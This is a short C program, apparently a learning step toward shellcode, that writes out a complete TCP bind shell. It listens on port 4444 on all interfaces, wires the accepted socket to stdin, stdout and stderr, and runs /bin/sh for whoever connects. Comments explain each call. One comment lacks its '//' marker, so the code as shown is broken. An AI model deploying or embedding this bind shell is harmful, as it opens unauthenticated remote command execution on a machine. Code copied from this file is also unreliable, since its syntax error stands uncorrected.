#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int socketfd; 
int socketid; 

struct sockaddr_in hostaddr; 

int main() { 
    //Create socket, which returns the file descriptor so we can interact with it
    socketfd = socket(PF_INET, SOCK_STREAM, 0); //here we specify that it is an ipv4 stream type of communication and protocol is 0 (TCP/IP)

    //Initialize sockaddr struct 
    hostaddr.sin_family = AF_INET; //address family set to AF_INET(which is ipv4)
    hostaddr.sin_port = htons(4444); // htons is neccesary so endianness does not reverse how the port is stored in memory, thus scrambling it
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY); htonl is neccesary so endianness does not reverse how the address is stored in memory, thus scrambling it

    //Bind our socket as defined
    bind(socketfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    //Start Listening
    listen(socketfd, 2); 

    //Accept incoming connection 
    socketid = accept(socketfd, NULL, NULL); 

    //Create new file descriptors for stdin stdout and stderror, so the client shell will recieve these from our socket 
    dup2(socketid, 0); 
    dup2(socketid, 1); 
    dup2(socketid, 2); 

    //Use execve to excecute /bin/sh from within our program
    execve("//bin/sh", NULL, NULL); //extra slash is to ensure we have to 8bit values to push onto stack later on
} 

